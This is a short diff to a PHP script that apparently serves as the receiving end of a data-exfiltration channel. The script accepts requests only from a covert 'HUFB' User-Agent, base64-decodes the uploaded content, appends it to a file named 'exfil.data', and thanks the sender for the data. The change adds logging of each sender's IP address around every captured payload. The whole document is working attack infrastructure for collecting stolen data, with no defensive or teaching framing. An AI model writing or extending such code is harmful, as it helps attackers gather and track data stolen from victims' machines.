@@ -6,7 +6,13 @@ if ($user_agent == 'HUFB') {
 	$file = '/home/ubuntu/data/exfil.data';
 	$saved_file = fopen($file, 'a');
 	$decoded = base64_decode($content);
+	$source = $_SERVER['REMOTE_ADDR'];
+	$begin = $source . ' - Capturing';
+	$end = $source . ' - Finished';
+	fwrite($saved_file, $begin);
+	fwrite($saved_file, "\n");
 	fwrite($saved_file, $decoded);
+	fwrite($saved_file, $end);
 	fwrite($saved_file, "\n");
 	fclose($saved_file);
 	echo 'Success...thanks for the data!';
